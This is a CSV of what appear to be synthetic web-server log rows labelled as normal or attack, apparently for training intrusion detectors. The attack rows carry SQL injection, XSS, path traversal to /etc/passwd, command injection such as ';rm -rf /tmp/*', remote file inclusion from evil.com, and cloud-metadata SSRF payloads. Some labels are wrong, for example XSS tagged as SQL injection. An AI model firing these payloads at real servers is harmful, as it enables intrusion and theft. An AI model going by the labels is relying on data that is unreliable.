logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-13T01:24:55+09:00,10.0.0.160,POST,/search?q=<script>alert('x')</script>,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",True,sql_injection,2025-05-06T13:35:49+09:00,browser,-
2025-05-06T21:51:43+09:00,107.32.250.219,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,curl/8.0,True,tls_probe,2025-05-05T13:21:48+09:00,script,-
2025-05-04T16:24:29+09:00,10.0.0.24,GET,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,wpscan/3.8.23,True,sql_injection,2025-05-07T07:52:05+09:00,pentest_tool,-
2025-05-07T12:51:05+09:00,192.168.0.107,POST,/about?page=4,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-06T06:49:19+09:00,browser,https://www.facebook.com/
2025-05-01T09:01:20+09:00,10.0.0.133,POST,/product%3Fid%3D10%3BDROP%20TABLE%20users,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,True,sql_injection,2025-05-07T17:33:40+09:00,browser,https://google.com/search?q=example
2025-05-01T16:59:38+09:00,192.168.0.225,POST,/css/style.css,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-05T15:54:20+09:00,mobile_browser,https://example.com/prev
2025-05-07T08:13:25+09:00,10.0.0.43,GET,/comment?msg=<script>alert('x')</script>,403,Metasploit/6.4,True,xss,2025-05-02T23:49:39+09:00,pentest_tool,-
2025-05-12T00:40:00+09:00,132.10.221.105,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,403,curl/7.3,True,tls_probe,2025-05-03T12:02:58+09:00,script,https://google.com/search?q=example
2025-05-07T16:10:39+09:00,10.0.0.107,GET,/images/....//....//etc/passwd,200,Nessus v10.5,True,directory_traversal,2025-05-07T06:51:55+09:00,pentest_tool,-
2025-05-12T07:39:32+09:00,143.154.155.145,POST,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-10T21:29:27+09:00,browser,https://example.com/
2025-05-11T20:46:37+09:00,10.0.0.221,POST,/login.php%3Fusername%3Dadmin%27%20OR%20%271%27%3D%271%27--%26password%3Dpw,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",True,sql_injection,2025-05-02T12:25:05+09:00,browser,https://twitter.com/
2025-05-14T22:16:53+09:00,10.0.0.162,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,ssrf_rfi,2025-05-02T11:14:44+09:00,crawler,-
2025-05-12T01:46:02+09:00,10.0.0.185,POST,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,True,xss,2025-05-06T22:47:29+09:00,browser,https://google.com/search?q=example
2025-05-01T13:16:06+09:00,197.187.205.79,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,python-requests/2.40,True,tls_probe,2025-05-06T15:18:51+09:00,script,-
2025-05-08T15:26:38+09:00,192.168.0.248,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-01T07:13:26+09:00,browser,https://google.com/search?q=example
2025-05-12T09:30:01+09:00,10.0.0.28,GET,/admin/backup?file=config;echo+x,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Edge/102.0,True,command_injection,2025-05-06T07:51:13+09:00,browser,-
2025-05-05T19:06:32+09:00,64.234.84.208,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-14T11:27:58+09:00,browser,-
2025-05-11T13:59:10+09:00,10.0.0.9,POST,/login.php%253Fusername%253Dadmin%2527%2520OR%2520%25271%2527%253D%25271%2527--%2526password%253Dpw,200,curl/8.9,True,sql_injection,2025-05-02T22:34:28+09:00,script,-
2025-05-01T17:57:12+09:00,10.0.0.71,GET,/load?file=http://evil.com/shell.txt,404,sqlmap/1.7#stable,True,ssrf_rfi,2025-05-06T12:25:24+09:00,pentest_tool,-
2025-05-07T05:29:11+09:00,185.111.104.216,GET,/login.php?username=admin' OR '1'='1'--,200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-02T21:32:09+09:00,pentest_tool,-
2025-05-06T17:13:44+09:00,192.168.0.183,GET,/products,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",False,normal,2025-05-07T19:01:53+09:00,browser,-
2025-05-08T12:35:22+09:00,10.86.216.141,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-08T12:35:22+09:00,unknown,-
2025-05-03T00:40:30+09:00,10.0.0.127,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,Nessus v10.5,True,ssrf_rfi,2025-05-07T20:01:14+09:00,pentest_tool,-
2025-05-06T07:11:54+09:00,10.0.0.240,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,200,wpscan/3.8.23,True,ssrf_rfi,2025-05-04T09:07:45+09:00,pentest_tool,-
2025-05-07T17:03:08+09:00,10.239.97.5,GET,/search?q=laptop&page=5,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-07T17:03:08+09:00,browser,https://search.example.com?q=shoes
2025-05-01T22:12:07+09:00,192.168.0.103,POST,/home?page=5,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,False,normal,2025-05-01T21:46:01+09:00,browser,https://www.facebook.com/
2025-05-03T21:27:07+09:00,10.0.0.22,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,sqlmap/1.7#stable,True,xss,2025-05-07T21:22:15+09:00,pentest_tool,-
2025-05-06T13:39:19+09:00,31.246.137.54,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-10T17:30:15+09:00,browser,-
2025-05-03T15:11:37+09:00,192.168.0.5,GET,/about,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-03T15:28:07+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-12T16:22:18+09:00,10.0.0.224,GET,/load?file=http://evil.com/shell.txt,500,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,ssrf_rfi,2025-05-03T18:46:51+09:00,crawler,-
2025-05-13T16:04:29+09:00,192.168.0.217,POST,/home,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",False,normal,2025-05-03T13:27:09+09:00,browser,https://example.com/prev
2025-05-10T08:22:40+09:00,192.168.0.243,POST,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-02T18:33:57+09:00,browser,https://bing.com/search?q=foo
2025-05-04T13:54:19+09:00,10.0.0.214,GET,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,curl/8.2,True,xss,2025-05-07T08:45:44+09:00,script,-
2025-05-09T07:40:14+09:00,192.168.0.24,GET,/home,200,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-06T21:39:44+09:00,mobile_browser,https://example.com/prev
2025-05-14T11:20:32+09:00,250.252.254.253,GET,/contact,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-06T07:53:21+09:00,browser,-
2025-05-02T21:24:29+09:00,10.0.0.84,POST,/../../../../etc/passwd,403,OWASP ZAP,True,directory_traversal,2025-05-01T18:26:10+09:00,pentest_tool,-
2025-05-03T22:11:33+09:00,10.0.0.145,GET,/product%3Fid%3D10%3BDROP%20TABLE%20users,200,sqlmap/1.7#stable,True,sql_injection,2025-05-06T19:54:48+09:00,pentest_tool,-
2025-05-03T12:58:14+09:00,10.0.0.111,POST,/ping?host=8.8.8.8;cat+/etc/passwd,200,wpscan/3.8.23,True,command_injection,2025-05-06T20:39:00+09:00,pentest_tool,-
2025-05-02T07:20:42+09:00,10.0.0.180,GET,/login.php?username=admin' OR '1'='1'--&password=pw,500,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),True,sql_injection,2025-05-06T21:05:56+09:00,crawler,-
2025-05-08T01:10:02+09:00,192.168.0.56,POST,/,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-04T23:37:44+09:00,mobile_browser,https://www.facebook.com/
2025-05-06T01:38:09+09:00,192.168.0.189,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0,False,normal,2025-05-05T12:49:47+09:00,browser,https://example.com/prev
2025-05-14T01:13:20+09:00,192.168.0.34,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,500,OWASP ZAP,True,ssrf_rfi,2025-05-06T20:04:56+09:00,pentest_tool,-
2025-05-02T01:44:23+09:00,10.0.0.90,GET,/admin/backup%253Ffile%253Dconfig%253Becho%252Bx,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0,True,command_injection,2025-05-04T18:05:44+09:00,browser,-
2025-05-06T07:10:24+09:00,192.168.0.92,POST,/api/v1/user/35?page=4,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-03T11:06:28+09:00,browser,https://bing.com/search?q=foo
2025-05-10T18:15:15+09:00,48.252.78.222,GET,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,Nikto/2.5.0,True,command_injection,2025-05-10T21:55:30+09:00,pentest_tool,-
2025-05-10T17:37:53+09:00,10.0.0.162,POST,/../../../../etc/passwd,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,directory_traversal,2025-05-01T11:59:57+09:00,crawler,https://twitter.com/
2025-05-13T17:11:41+09:00,10.0.0.46,POST,/images/....//....//etc/passwd,403,curl/7.6,True,directory_traversal,2025-05-07T15:02:41+09:00,script,https://www.facebook.com/
2025-05-04T07:44:53+09:00,192.168.0.250,POST,/products,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T16:31:31+09:00,crawler,-
2025-05-08T03:33:39+09:00,16.201.189.221,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,directory_traversal,2025-05-01T02:16:41+09:00,browser,-
2025-05-03T22:14:33+09:00,222.22.251.95,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-14T14:50:07+09:00,browser,-
2025-05-09T11:57:12+09:00,119.49.23.56,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-02T13:28:46+09:00,browser,-
2025-05-07T13:32:40+09:00,192.168.0.43,POST,/products/4.html,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",False,normal,2025-05-02T14:26:01+09:00,browser,https://example.com/prev
2025-05-11T01:13:45+09:00,151.219.213.138,BADTLS,\x16\x03\x01\x00\9c\x01\x00…,400,-,True,tls_probe,2025-05-06T11:45:33+09:00,pentest_tool,-
2025-05-03T12:53:43+09:00,192.168.0.238,GET,/products,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-06T14:26:40+09:00,mobile_browser,https://google.com/search?q=example
2025-05-13T09:45:49+09:00,10.0.0.160,POST,/../../../../etc/passwd,500,sqlmap/1.7#stable,True,directory_traversal,2025-05-04T18:04:28+09:00,pentest_tool,-
2025-05-09T18:24:14+09:00,50.210.35.71,POST,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-04T12:36:17+09:00,browser,https://example.com/
2025-05-07T22:44:04+09:00,192.168.0.21,POST,/js/app.js?page=5,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0,False,normal,2025-05-06T16:08:57+09:00,browser,-
2025-05-12T10:04:48+09:00,205.56.184.41,BADTLS,\x16\x03\x01\x00\d2\x01\x00…,400,-,True,tls_probe,2025-05-14T20:42:58+09:00,pentest_tool,-
2025-05-07T14:55:57+09:00,182.99.106.15,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-01T04:14:18+09:00,browser,-
2025-05-06T17:46:51+09:00,192.168.0.246,GET,/login?page=3,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-03T19:21:59+09:00,browser,https://www.facebook.com/
2025-05-03T22:16:24+09:00,192.168.0.142,GET,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,False,normal,2025-05-07T13:15:31+09:00,browser,https://example.com/prev
2025-05-09T16:12:51+09:00,10.222.188.110,POST,/login?username=user598&password=pass8403,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",False,normal,2025-05-09T16:12:51+09:00,browser,-
2025-05-14T10:48:56+09:00,157.58.163.177,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-04T19:02:13+09:00,pentest_tool,-
2025-05-08T17:24:02+09:00,10.0.0.177,POST,/admin/backup?file=config;echo+x,200,Metasploit/6.4,True,command_injection,2025-05-05T22:07:45+09:00,pentest_tool,-
2025-05-08T15:45:34+09:00,192.168.0.192,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,False,normal,2025-05-01T18:56:15+09:00,browser,https://www.facebook.com/
2025-05-06T09:31:13+09:00,26.174.220.205,GET,/static/js/app.js,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-10T13:54:06+09:00,browser,https://example.com/
2025-05-10T12:35:03+09:00,10.0.0.106,POST,/product%3Fid%3D10%3BDROP%20TABLE%20users,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0,True,sql_injection,2025-05-02T13:35:38+09:00,browser,-
2025-05-11T19:28:59+09:00,239.26.226.62,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-08T12:47:45+09:00,browser,https://example.com/
2025-05-11T16:43:38+09:00,192.168.0.250,POST,/home,404,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",False,normal,2025-05-02T13:57:43+09:00,browser,https://twitter.com/
2025-05-10T16:59:27+09:00,10.0.0.56,POST,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,500,Nikto/2.1.6 (Evasions:none),True,xss,2025-05-04T09:49:03+09:00,pentest_tool,-
2025-05-11T08:39:00+09:00,192.168.0.167,GET,/search?q=shoes,304,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",False,normal,2025-05-06T07:22:28+09:00,browser,-
2025-05-03T15:18:19+09:00,10.0.0.188,BADTLS,/api/v1/user/35,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,False,normal,2025-05-04T14:58:10+09:00,browser,-
2025-05-12T07:18:18+09:00,192.168.0.248,GET,/search?q=shoes,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Edge/109.0,False,normal,2025-05-02T15:58:10+09:00,browser,https://www.facebook.com/
2025-05-06T20:16:07+09:00,192.168.0.231,GET,/signup,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-05T21:53:57+09:00,crawler,https://www.facebook.com/
2025-05-09T00:54:15+09:00,8.226.71.195,GET,/include?template=http://evil.com/shell.txt,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-08T15:44:21+09:00,script,-
2025-05-06T00:22:59+09:00,192.168.0.33,POST,/about?page=4,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-07T14:59:55+09:00,crawler,-
2025-05-09T22:28:14+09:00,10.82.4.215,GET,/search?q=bags&page=2,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-09T22:28:14+09:00,browser,https://search.example.com?q=shoes
2025-05-03T00:45:03+09:00,10.0.0.196,POST,/admin/backup?file=config;echo+x,500,python-requests/2.00,True,command_injection,2025-05-05T15:59:18+09:00,script,-
2025-05-05T11:06:04+09:00,130.187.127.201,GET,/images/../../../etc/passwd,403,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-04T00:42:25+09:00,browser,-
2025-05-01T20:13:44+09:00,10.219.110.249,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-01T20:13:44+09:00,unknown,-
2025-05-02T14:29:46+09:00,14.228.187.174,GET,/contact,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-14T09:07:38+09:00,browser,https://example.com/
2025-05-11T16:20:58+09:00,10.0.0.10,GET,/../../../../etc/passwd,200,curl/7.5,True,directory_traversal,2025-05-01T15:46:10+09:00,script,-
2025-05-08T17:27:49+09:00,192.168.0.42,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,404,Nikto/2.1.6 (Evasions:none),True,sql_injection,2025-05-06T13:15:07+09:00,pentest_tool,-
2025-05-07T13:47:03+09:00,192.168.0.43,POST,/products,304,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T06:09:38+09:00,mobile_browser,-
2025-05-07T20:16:10+09:00,229.57.158.29,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-11T04:35:57+09:00,browser,https://example.com/
2025-05-01T14:11:32+09:00,96.180.91.182,GET,/product?id=5 OR 1=1;--,200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-01T07:46:00+09:00,pentest_tool,-
2025-05-05T00:48:33+09:00,10.0.0.193,POST,/login.php%253Fusername%253Dadmin%2527%2520OR%2520%25271%2527%253D%25271%2527--%2526password%253Dpw,500,sqlmap/1.7#stable,True,sql_injection,2025-05-02T11:18:57+09:00,pentest_tool,-
2025-05-09T20:00:50+09:00,192.168.0.181,POST,/js/app.js?page=3,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-01T18:40:34+09:00,browser,https://twitter.com/
2025-05-10T01:40:49+09:00,10.0.0.2,GET,/search?q=<script>alert('x')</script>,500,sqlmap/1.7#stable,True,sql_injection,2025-05-04T11:41:42+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-01T21:48:25+09:00,192.168.0.134,GET,/login,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,False,normal,2025-05-07T20:43:13+09:00,browser,https://bing.com/search?q=foo
2025-05-09T03:31:30+09:00,227.127.203.148,POST,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-13T01:10:18+09:00,browser,-
2025-05-12T12:49:57+09:00,10.86.79.179,GET,/products?page=9,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-12T12:49:57+09:00,browser,https://search.example.com?q=shoes
2025-05-11T08:17:37+09:00,10.0.0.169,POST,/login.php?username=admin' OR '1'='1'--&password=pw,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0,True,sql_injection,2025-05-04T14:25:12+09:00,browser,-
2025-05-06T20:03:38+09:00,10.0.0.66,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,200,python-requests/2.00,True,command_injection,2025-05-02T13:58:03+09:00,script,https://example.com/prev
2025-05-11T08:20:32+09:00,10.0.0.177,GET,/images/....//....//etc/passwd,403,BurpSuite Community/2025.4,True,directory_traversal,2025-05-07T06:02:22+09:00,pentest_tool,-
2025-05-14T00:35:57+09:00,10.0.0.44,GET,/ping?host=8.8.8.8;cat+/etc/passwd,404,Twitterbot/1.0,True,command_injection,2025-05-03T13:07:50+09:00,crawler,-
2025-05-08T00:37:00+09:00,10.0.0.103,POST,/images/....//....//etc/passwd,200,BurpSuite Community/2025.4,True,directory_traversal,2025-05-04T18:28:28+09:00,pentest_tool,-
2025-05-04T17:15:32+09:00,244.105.24.94,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-02T04:08:50+09:00,browser,https://example.com/
2025-05-06T22:50:14+09:00,10.55.16.144,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-06T22:50:14+09:00,unknown,-
2025-05-02T21:44:14+09:00,249.214.241.223,GET,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-05T17:32:40+09:00,browser,https://example.com/
2025-05-04T07:50:01+09:00,190.158.191.243,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,tls_probe,2025-05-01T12:22:33+09:00,crawler,-
2025-05-09T08:49:26+09:00,10.0.0.5,GET,/load?file=http://evil.com/shell.txt,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-05T06:45:27+09:00,browser,-
2025-05-06T17:35:39+09:00,10.0.0.127,POST,/images/....//....//etc/passwd,403,wget/1.9,True,directory_traversal,2025-05-01T07:26:01+09:00,script,-
2025-05-11T01:57:40+09:00,86.168.98.213,GET,/,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-09T22:34:55+09:00,browser,-
2025-05-06T22:30:56+09:00,10.0.0.61,POST,/../../../../etc/passwd,403,curl/7.7,True,directory_traversal,2025-05-02T06:16:50+09:00,script,-
2025-05-01T17:36:11+09:00,10.0.0.178,POST,/signup?page=1,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-03T08:21:00+09:00,crawler,https://www.facebook.com/
2025-05-10T00:29:44+09:00,10.0.0.227,POST,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,curl/8.8,True,sql_injection,2025-05-04T11:41:19+09:00,script,-
2025-05-12T15:30:34+09:00,10.0.0.111,GET,/search?q=<script>alert('x')</script>,403,Metasploit/6.4,True,sql_injection,2025-05-03T17:57:30+09:00,pentest_tool,-
2025-05-03T17:37:33+09:00,10.0.0.71,GET,/ping?host=8.8.8.8;cat+/etc/passwd,403,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-01T14:09:11+09:00,pentest_tool,-
2025-05-01T23:09:12+09:00,173.136.208.69,GET,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-11T06:21:34+09:00,browser,-
2025-05-06T00:02:53+09:00,192.168.0.77,GET,/js/app.js,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T17:42:01+09:00,mobile_browser,https://example.com/prev
2025-05-08T22:58:25+09:00,192.168.0.154,GET,/products/4.html,500,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-07T12:08:24+09:00,mobile_browser,https://example.com/prev
2025-05-09T20:40:53+09:00,10.0.0.104,GET,/product%3Fid%3D10%3BDROP%20TABLE%20users,403,Nikto/2.1.6 (Evasions:none),True,sql_injection,2025-05-07T11:14:20+09:00,pentest_tool,-
2025-05-12T08:38:42+09:00,192.168.0.114,GET,/search?q=shoes,302,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-06T23:58:29+09:00,mobile_browser,https://example.com/prev
2025-05-04T17:10:42+09:00,174.190.144.121,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,403,Metasploit/6.4,True,tls_probe,2025-05-03T18:46:29+09:00,pentest_tool,-
2025-05-12T20:31:56+09:00,10.0.0.250,POST,/comment?msg=<script>alert('x')</script>,404,python-requests/2.50,True,xss,2025-05-06T20:50:49+09:00,script,-
2025-05-03T17:48:24+09:00,10.0.0.132,GET,/search?q=<script>alert('x')</script>,200,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),True,xss,2025-05-07T11:34:03+09:00,crawler,-
2025-05-04T12:14:25+09:00,192.168.0.252,GET,/,302,python-requests/2.95,False,normal,2025-05-02T20:21:54+09:00,script,https://www.facebook.com/
2025-05-07T21:24:39+09:00,10.0.0.187,GET,/product%3Fid%3D10%3BDROP%20TABLE%20users,500,wget/1.0,True,sql_injection,2025-05-03T13:10:52+09:00,script,-
2025-05-11T01:40:39+09:00,10.0.0.173,GET,/../../../../etc/passwd,500,Metasploit/6.4,True,directory_traversal,2025-05-03T12:59:13+09:00,pentest_tool,https://google.com/search?q=example
2025-05-14T21:12:38+09:00,10.0.0.206,GET,/proxy%253Furl%253Dhttp%253A//169.254.169.254/latest/meta-data/,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,True,ssrf_rfi,2025-05-05T16:05:12+09:00,browser,-
